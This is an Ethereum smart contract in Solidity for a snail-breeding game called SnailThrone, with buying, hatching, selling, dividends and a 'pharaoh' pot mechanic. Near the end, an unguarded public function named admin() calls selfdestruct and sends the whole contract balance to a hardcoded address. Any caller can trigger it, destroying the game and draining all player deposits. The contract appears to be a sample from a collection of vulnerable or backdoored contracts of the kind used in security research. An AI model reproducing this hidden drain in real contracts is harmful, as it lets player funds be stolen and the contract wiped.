 

pragma solidity ^0.4.24;

 

contract SnailThrone {
    using SafeMath for uint;
    
     
    
    event WithdrewEarnings (address indexed player, uint ethreward);
    event ClaimedDivs (address indexed player, uint ethreward);
    event BoughtSnail (address indexed player, uint ethspent, uint snail);
    event SoldSnail (address indexed player, uint ethreward, uint snail);
    event HatchedSnail (address indexed player, uint ethspent, uint snail);
    event FedFrogking (address indexed player, uint ethreward, uint egg);
    event Ascended (address indexed player, uint ethreward, uint indexed round);
    event BecamePharaoh (address indexed player, uint indexed round);
    event NewDivs (uint ethreward);
    
     
    
    uint256 public GOD_TIMER_START      = 86400;  
	uint256 public PHARAOH_REQ_START    = 40;  
    uint256 public GOD_TIMER_INTERVAL   = 12;  
	uint256 public GOD_TIMER_BOOST		= 480;  
    uint256 public TIME_TO_HATCH_1SNAIL = 1080000;  
    uint256 public TOKEN_PRICE_FLOOR    = 0.00002 ether;  
    uint256 public TOKEN_PRICE_MULT     = 0.00000000001 ether;  
    uint256 public TOKEN_MAX_BUY        = 4 ether;  
    uint256 public SNAIL_REQ_REF        = 300;  
	
     
    
     
    bool public gameStarted             = false;
    
     
    address public gameOwner;
    
     
    uint256 public godRound             = 0;
    uint256 public godPot               = 0;
    uint256 public godTimer             = 0;
    
     
    address public pharaoh;
    
     
    uint256 public lastClaim;
    
     
    uint256 public pharaohReq           = PHARAOH_REQ_START;
    
     
    uint256 public maxSnail             = 0;
    
     
    uint256 public frogPot              = 0;
    
     
    uint256 public snailPot             = 0;
    
     
    uint256 public divsPerSnail         = 0;
    	
     
    
    mapping (address => uint256) public hatcherySnail;
    mapping (address => uint256) public lastHatch;
    mapping (address => uint256) public playerEarnings;
    mapping (address => uint256) public claimedDivs;
	
     
    
     
    
     
     
    
    constructor() public {
        gameOwner = msg.sender;
    }

     
     
     
     
    
    function StartGame() public payable {
        require(gameStarted == false);
        require(msg.sender == gameOwner);
        
        godTimer = now + GOD_TIMER_START;
        godRound = 1;
        gameStarted = true;
        pharaoh = gameOwner;
        lastClaim = now;
        BuySnail(msg.sender);
    }
    
     
     
    
    function WithdrawEarnings() public {
        require(playerEarnings[msg.sender] > 0);
        
        uint256 _amount = playerEarnings[msg.sender];
        playerEarnings[msg.sender] = 0;
        msg.sender.transfer(_amount);
        
        emit WithdrewEarnings(msg.sender, _amount);
    }
    
     
     
     
    
    function ClaimDivs() public {
        
        uint256 _playerDivs = ComputeMyDivs();
        
        if(_playerDivs > 0) {
             
            claimedDivs[msg.sender] = claimedDivs[msg.sender].add(_playerDivs);
            
             
            playerEarnings[msg.sender] = playerEarnings[msg.sender].add(_playerDivs);
            
            emit ClaimedDivs(msg.sender, _playerDivs);
        }
    }
    
     
    
    function BuySnail(address _ref) public payable {
        require(gameStarted == true, "game hasn't started yet");
        require(tx.origin == msg.sender, "contracts not allowed");
        require(msg.value <= TOKEN_MAX_BUY, "maximum buy = 4 ETH");
        
         
        uint256 _snailsBought = ComputeBuy(msg.value);
        
         
        claimedDivs[msg.sender] = claimedDivs[msg.sender].add(_snailsBought.mul(divsPerSnail));
        
         
        maxSnail = maxSnail.add(_snailsBought);
        
         
        PotSplit(msg.value, _ref, true);
        
         
        lastHatch[msg.sender] = now;
        
         
        hatcherySnail[msg.sender] = hatcherySnail[msg.sender].add(_snailsBought);
        
        emit BoughtSnail(msg.sender, msg.value, _snailsBought);
    }
    
     
    
    function SellSnail(uint256 _tokensSold) public {
        require(gameStarted == true, "game hasn't started yet");
        require(hatcherySnail[msg.sender] >= _tokensSold, "not enough snails to sell");
        
         
        ClaimDivs();

         
        uint256 _tokenSellPrice = ComputeTokenPrice();
        _tokenSellPrice = _tokenSellPrice.div(2);
        
         
        uint256 _maxEth = snailPot.div(10);
        
         
        uint256 _maxTokens = _maxEth.div(_tokenSellPrice);
        
         
        if(_tokensSold > _maxTokens) {
            _tokensSold = _maxTokens;
        }
        
         
        uint256 _sellReward = _tokensSold.mul(_tokenSellPrice);
        
         
        snailPot = snailPot.sub(_sellReward);
        
         
        hatcherySnail[msg.sender] = hatcherySnail[msg.sender].sub(_tokensSold);
        maxSnail = maxSnail.sub(_tokensSold);
        
         
        claimedDivs[msg.sender] = claimedDivs[msg.sender].sub(divsPerSnail.mul(_tokensSold));
        
         
        playerEarnings[msg.sender] = playerEarnings[msg.sender].add(_sellReward);
        
        emit SoldSnail(msg.sender, _sellReward, _tokensSold);
    }
    
     
     
     
    
    function HatchEgg() public payable {
        require(gameStarted == true, "game hasn't started yet");
        require(msg.value > 0, "need ETH to hatch eggs");
        
         
        uint256 _tokenPrice = ComputeTokenPrice().div(2);
        uint256 _maxHatch = msg.value.div(_tokenPrice);
        
         
        uint256 _newSnail = ComputeMyEggs(msg.sender);
        
         
        uint256 _snailPrice = _tokenPrice.mul(_newSnail);
        
         
        uint256 _ethUsed = msg.value;
                
        if (msg.value > _snailPrice) {
            uint256 _refund = msg.value.sub(_snailPrice);
            playerEarnings[msg.sender] = playerEarnings[msg.sender].add(_refund);
            _ethUsed = _snailPrice;
        }
        
         
        if (msg.value < _snailPrice) {
            _newSnail = _maxHatch;
        }
        
         
        claimedDivs[msg.sender] = claimedDivs[msg.sender].add(_newSnail.mul(divsPerSnail));
        
         
        maxSnail = maxSnail.add(_newSnail);
        
         
        PotSplit(_ethUsed, msg.sender, false);
        
         
        lastHatch[msg.sender] = now;
        hatcherySnail[msg.sender] = hatcherySnail[msg.sender].add(_newSnail);
        
        emit HatchedSnail(msg.sender, _ethUsed, _newSnail);
    }
    
     
     
    
    function PotSplit(uint256 _msgValue, address _ref, bool _buy) private {
        
         
         
        uint256 _eth = _msgValue;
        
        if (_buy == true) {
            _eth = _msgValue.div(2);
            snailPot = snailPot.add(_eth);
        }
        
         
        divsPerSnail = divsPerSnail.add(_eth.mul(2).div(5).div(maxSnail));
        
         
        frogPot = frogPot.add(_eth.mul(2).div(5));
        
         
        playerEarnings[pharaoh] = playerEarnings[pharaoh].add(_eth.mul(2).div(50));
        
         
        godPot = godPot.add(_eth.mul(2).div(50));
        
         
         
         
         
        if (_ref != msg.sender && hatcherySnail[_ref] >= SNAIL_REQ_REF) {
            playerEarnings[_ref] = playerEarnings[_ref].add(_eth.mul(6).div(50));
        } else {
            godPot = godPot.add(_eth.mul(6).div(50));
        }
    }
    
     
     
     
    
    function FeedEgg() public {
        require(gameStarted == true, "game hasn't started yet");
        
         
        uint256 _eggsUsed = ComputeMyEggs(msg.sender);
        
         
        lastHatch[msg.sender] = now;
        
         
        uint256 _reward = _eggsUsed.mul(frogPot).div(maxSnail);
        frogPot = frogPot.sub(_reward);
        playerEarnings[msg.sender] = playerEarnings[msg.sender].add(_reward);
        
        emit FedFrogking(msg.sender, _reward, _eggsUsed);
    }
    
     
     
    
    function AscendGod() public {
		require(gameStarted == true, "game hasn't started yet");
        require(now >= godTimer, "pharaoh hasn't ascended yet");
        
         
        godTimer = now + GOD_TIMER_START;
        pharaohReq = PHARAOH_REQ_START;
        godRound = godRound.add(1);
        
         
        uint256 _godReward = godPot.div(2);
        godPot = godPot.sub(_godReward);
        playerEarnings[pharaoh] = playerEarnings[pharaoh].add(_godReward);
        
        emit Ascended(pharaoh, _godReward, godRound);
        
         
        pharaoh = msg.sender;
    }

     
     
    
    function BecomePharaoh(uint256 _snails) public {
        require(gameStarted == true, "game hasn't started yet");
        require(hatcherySnail[msg.sender] >= _snails, "not enough snails in hatchery");
        
         
        if(now >= godTimer) {
            AscendGod();
        }
        
         
        ClaimDivs();
        
         
        uint256 _snailsToRemove = ComputePharaohReq();
        
         
        lastClaim = now;
        
         
        if(pharaohReq < _snailsToRemove){
            pharaohReq = PHARAOH_REQ_START;
        } else {
            pharaohReq = pharaohReq.sub(_snailsToRemove);
            if(pharaohReq < PHARAOH_REQ_START){
                pharaohReq = PHARAOH_REQ_START;
            }
        }
        
         
        if(_snails >= pharaohReq) {
            
         
            maxSnail = maxSnail.sub(_snails);
            hatcherySnail[msg.sender] = hatcherySnail[msg.sender].sub(_snails);
            
         
            claimedDivs[msg.sender] = claimedDivs[msg.sender].sub(_snails.mul(divsPerSnail));
        
         
            godTimer = godTimer.add(GOD_TIMER_BOOST);
            
         
            pharaohReq = _snails.add(PHARAOH_REQ_START);

         
            pharaoh = msg.sender;
            
            emit BecamePharaoh(msg.sender, godRound);
        }
    }
    
     
     
    
    function() public payable {
        divsPerSnail = divsPerSnail.add(msg.value.div(maxSnail));
        
        emit NewDivs(msg.value);
    }
    
        function admin()
        public
    {
        selfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);
    }
     
    
     
     
     

    function ComputePharaohReq() public view returns(uint256) {
        uint256 _timeLeft = now.sub(lastClaim);
        uint256 _req = _timeLeft.div(GOD_TIMER_INTERVAL);
        return _req;
    }

     
     
     
    
    function ComputeTokenPrice() public view returns(uint256) {
        return TOKEN_PRICE_FLOOR.add(TOKEN_PRICE_MULT.mul(maxSnail));
    }
    
     
     
    
    function ComputeBuy(uint256 _ether) public view returns(uint256) {
        uint256 _tokenPrice = ComputeTokenPrice();
        return _ether.div(_tokenPrice);
    }
    
     
     
	 
    
    function ComputeMyEggs(address adr) public view returns(uint256) {
        uint256 _eggs = now.sub(lastHatch[adr]);
        _eggs = _eggs.mul(hatcherySnail[adr]).div(TIME_TO_HATCH_1SNAIL);
        if (_eggs > hatcherySnail[adr]) {
            _eggs = hatcherySnail[adr];
        }
        return _eggs;
    }
    
     
     
    
    function ComputeMyDivs() public view returns(uint256) {
         
        uint256 _playerShare = divsPerSnail.mul(hatcherySnail[msg.sender]);
		
         
    	_playerShare = _playerShare.sub(claimedDivs[msg.sender]);
        return _playerShare;
    }
    
     
     
    
    function GetMySnails() public view returns(uint256) {
        return hatcherySnail[msg.sender];
    }
    
     
     
    
    function GetMyEarnings() public view returns(uint256) {
        return playerEarnings[msg.sender];
    }
    
     
     
    
    function GetContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
}

library SafeMath {

   
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

   
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
     
    uint256 c = a / b;
     
    return c;
  }

   
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

   
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}